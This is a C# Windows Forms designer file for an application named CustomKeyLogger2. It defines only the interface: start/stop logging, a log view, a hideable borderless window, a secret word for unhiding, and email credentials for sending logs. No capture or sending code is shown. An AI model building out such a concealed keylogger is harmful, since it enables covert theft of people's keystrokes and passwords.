namespace CustomKeyLogger2
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.btnStart = new System.Windows.Forms.Button();
            this.btnStop = new System.Windows.Forms.Button();
            this.txtScrtWrd = new System.Windows.Forms.TextBox();
            this.btnSvScrtWrd = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.btnShow = new System.Windows.Forms.Button();
            this.txtLog = new System.Windows.Forms.TextBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.btnSaveKeyWord = new System.Windows.Forms.Button();
            this.txtKeyWord = new System.Windows.Forms.TextBox();
            this.btnHide = new System.Windows.Forms.Button();
            this.btnEmail = new System.Windows.Forms.Button();
            this.btnExit = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.txtEmail = new System.Windows.Forms.TextBox();
            this.txtPassWord = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.lblMailStatus = new System.Windows.Forms.Label();
            this.btnSaveEmail = new System.Windows.Forms.Button();
            this.timUnHide = new System.Windows.Forms.Timer(this.components);
            this.btnCreateDesktopShortcut = new System.Windows.Forms.Button();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnStart
            // 
            this.btnStart.Location = new System.Drawing.Point(18, 12);
            this.btnStart.Name = "btnStart";
            this.btnStart.Size = new System.Drawing.Size(75, 23);
            this.btnStart.TabIndex = 0;
            this.btnStart.Text = "Start";
            this.btnStart.UseVisualStyleBackColor = true;
            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
            // 
            // btnStop
            // 
            this.btnStop.Enabled = false;
            this.btnStop.Location = new System.Drawing.Point(107, 12);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new System.Drawing.Size(75, 23);
            this.btnStop.TabIndex = 0;
            this.btnStop.Text = "Stop";
            this.btnStop.UseVisualStyleBackColor = true;
            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
            // 
            // txtScrtWrd
            // 
            this.txtScrtWrd.Location = new System.Drawing.Point(6, 19);
            this.txtScrtWrd.Name = "txtScrtWrd";
            this.txtScrtWrd.Size = new System.Drawing.Size(83, 20);
            this.txtScrtWrd.TabIndex = 1;
            // 
            // btnSvScrtWrd
            // 
            this.btnSvScrtWrd.Location = new System.Drawing.Point(95, 17);
            this.btnSvScrtWrd.Name = "btnSvScrtWrd";
            this.btnSvScrtWrd.Size = new System.Drawing.Size(75, 23);
            this.btnSvScrtWrd.TabIndex = 4;
            this.btnSvScrtWrd.Text = "Save";
            this.btnSvScrtWrd.UseVisualStyleBackColor = true;
            this.btnSvScrtWrd.Click += new System.EventHandler(this.btnSvScrtWrd_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.btnSvScrtWrd);
            this.groupBox1.Controls.Add(this.txtScrtWrd);
            this.groupBox1.Location = new System.Drawing.Point(4, 195);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(178, 54);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Secret Word";
            // 
            // btnShow
            // 
            this.btnShow.Location = new System.Drawing.Point(107, 41);
            this.btnShow.Name = "btnShow";
            this.btnShow.Size = new System.Drawing.Size(75, 23);
            this.btnShow.TabIndex = 5;
            this.btnShow.Text = "Show Log";
            this.btnShow.UseVisualStyleBackColor = true;
            this.btnShow.Click += new System.EventHandler(this.btnShow_Click);
            // 
            // txtLog
            // 
            this.txtLog.Location = new System.Drawing.Point(196, 12);
            this.txtLog.Multiline = true;
            this.txtLog.Name = "txtLog";
            this.txtLog.ReadOnly = true;
            this.txtLog.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtLog.Size = new System.Drawing.Size(211, 237);
            this.txtLog.TabIndex = 5;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.btnSaveKeyWord);
            this.groupBox2.Controls.Add(this.txtKeyWord);
            this.groupBox2.Enabled = false;
            this.groupBox2.Location = new System.Drawing.Point(4, 255);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(178, 54);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Key Word";
            this.groupBox2.Visible = false;
            // 
            // btnSaveKeyWord
            // 
            this.btnSaveKeyWord.Location = new System.Drawing.Point(95, 17);
            this.btnSaveKeyWord.Name = "btnSaveKeyWord";
            this.btnSaveKeyWord.Size = new System.Drawing.Size(75, 23);
            this.btnSaveKeyWord.TabIndex = 4;
            this.btnSaveKeyWord.Text = "Save";
            this.btnSaveKeyWord.UseVisualStyleBackColor = true;
            this.btnSaveKeyWord.Click += new System.EventHandler(this.btnSaveKeyWord_Click);
            // 
            // txtKeyWord
            // 
            this.txtKeyWord.Location = new System.Drawing.Point(6, 19);
            this.txtKeyWord.Name = "txtKeyWord";
            this.txtKeyWord.Size = new System.Drawing.Size(83, 20);
            this.txtKeyWord.TabIndex = 1;
            // 
            // btnHide
            // 
            this.btnHide.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnHide.Location = new System.Drawing.Point(327, 255);
            this.btnHide.Name = "btnHide";
            this.btnHide.Size = new System.Drawing.Size(46, 23);
            this.btnHide.TabIndex = 7;
            this.btnHide.Text = "Hide";
            this.btnHide.UseVisualStyleBackColor = true;
            this.btnHide.Click += new System.EventHandler(this.btnHide_Click);
            // 
            // btnEmail
            // 
            this.btnEmail.Location = new System.Drawing.Point(16, 71);
            this.btnEmail.Name = "btnEmail";
            this.btnEmail.Size = new System.Drawing.Size(75, 23);
            this.btnEmail.TabIndex = 3;
            this.btnEmail.Text = "Email";
            this.btnEmail.UseVisualStyleBackColor = true;
            this.btnEmail.Click += new System.EventHandler(this.btnEmail_Click);
            // 
            // btnExit
            // 
            this.btnExit.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnExit.Location = new System.Drawing.Point(379, 255);
            this.btnExit.Name = "btnExit";
            this.btnExit.Size = new System.Drawing.Size(28, 23);
            this.btnExit.TabIndex = 8;
            this.btnExit.Text = "X";
            this.btnExit.UseVisualStyleBackColor = true;
            this.btnExit.Click += new System.EventHandler(this.btnExit_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(6, 22);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(32, 13);
            this.label1.TabIndex = 10;
            this.label1.Text = "Email";
            // 
            // txtEmail
            // 
            this.txtEmail.Location = new System.Drawing.Point(65, 19);
            this.txtEmail.Name = "txtEmail";
            this.txtEmail.Size = new System.Drawing.Size(107, 20);
            this.txtEmail.TabIndex = 11;
            // 
            // txtPassWord
            // 
            this.txtPassWord.Location = new System.Drawing.Point(65, 45);
            this.txtPassWord.Name = "txtPassWord";
            this.txtPassWord.PasswordChar = '*';
            this.txtPassWord.Size = new System.Drawing.Size(107, 20);
            this.txtPassWord.TabIndex = 13;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(6, 48);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(53, 13);
            this.label2.TabIndex = 12;
            this.label2.Text = "Password";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.lblMailStatus);
            this.groupBox3.Controls.Add(this.btnSaveEmail);
            this.groupBox3.Controls.Add(this.txtPassWord);
            this.groupBox3.Controls.Add(this.label2);
            this.groupBox3.Controls.Add(this.txtEmail);
            this.groupBox3.Controls.Add(this.label1);
            this.groupBox3.Controls.Add(this.btnEmail);
            this.groupBox3.Location = new System.Drawing.Point(4, 70);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(178, 119);
            this.groupBox3.TabIndex = 14;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Email";
            // 
            // lblMailStatus
            // 
            this.lblMailStatus.AutoSize = true;
            this.lblMailStatus.Location = new System.Drawing.Point(13, 97);
            this.lblMailStatus.Name = "lblMailStatus";
            this.lblMailStatus.Size = new System.Drawing.Size(59, 13);
            this.lblMailStatus.TabIndex = 16;
            this.lblMailStatus.Text = "Mail Status";
            // 
            // btnSaveEmail
            // 
            this.btnSaveEmail.Location = new System.Drawing.Point(97, 71);
            this.btnSaveEmail.Name = "btnSaveEmail";
            this.btnSaveEmail.Size = new System.Drawing.Size(75, 23);
            this.btnSaveEmail.TabIndex = 15;
            this.btnSaveEmail.Text = "Save";
            this.btnSaveEmail.UseVisualStyleBackColor = true;
            this.btnSaveEmail.Click += new System.EventHandler(this.btnSaveEmail_Click);
            // 
            // timUnHide
            // 
            this.timUnHide.Enabled = true;
            this.timUnHide.Interval = 60000;
            this.timUnHide.Tick += new System.EventHandler(this.timUnHide_Tick);
            // 
            // btnCreateDesktopShortcut
            // 
            this.btnCreateDesktopShortcut.Location = new System.Drawing.Point(4, 255);
            this.btnCreateDesktopShortcut.Name = "btnCreateDesktopShortcut";
            this.btnCreateDesktopShortcut.Size = new System.Drawing.Size(190, 23);
            this.btnCreateDesktopShortcut.TabIndex = 15;
            this.btnCreateDesktopShortcut.Text = "Create Desktop Shortcurt";
            this.btnCreateDesktopShortcut.UseVisualStyleBackColor = true;
            this.btnCreateDesktopShortcut.Click += new System.EventHandler(this.btnCreateDesktopShortcut_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(419, 283);
            this.ControlBox = false;
            this.Controls.Add(this.btnCreateDesktopShortcut);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.btnExit);
            this.Controls.Add(this.btnHide);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.txtLog);
            this.Controls.Add(this.btnShow);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.btnStop);
            this.Controls.Add(this.btnStart);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Form1";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Button btnStop;
        private System.Windows.Forms.TextBox txtScrtWrd;
        private System.Windows.Forms.Button btnSvScrtWrd;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button btnShow;
        private System.Windows.Forms.TextBox txtLog;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Button btnSaveKeyWord;
        private System.Windows.Forms.TextBox txtKeyWord;
        private System.Windows.Forms.Button btnHide;
        private System.Windows.Forms.Button btnEmail;
        private System.Windows.Forms.Button btnExit;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox txtEmail;
        private System.Windows.Forms.TextBox txtPassWord;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button btnSaveEmail;
        private System.Windows.Forms.Label lblMailStatus;
        private System.Windows.Forms.Timer timUnHide;
        private System.Windows.Forms.Button btnCreateDesktopShortcut;
    }
}

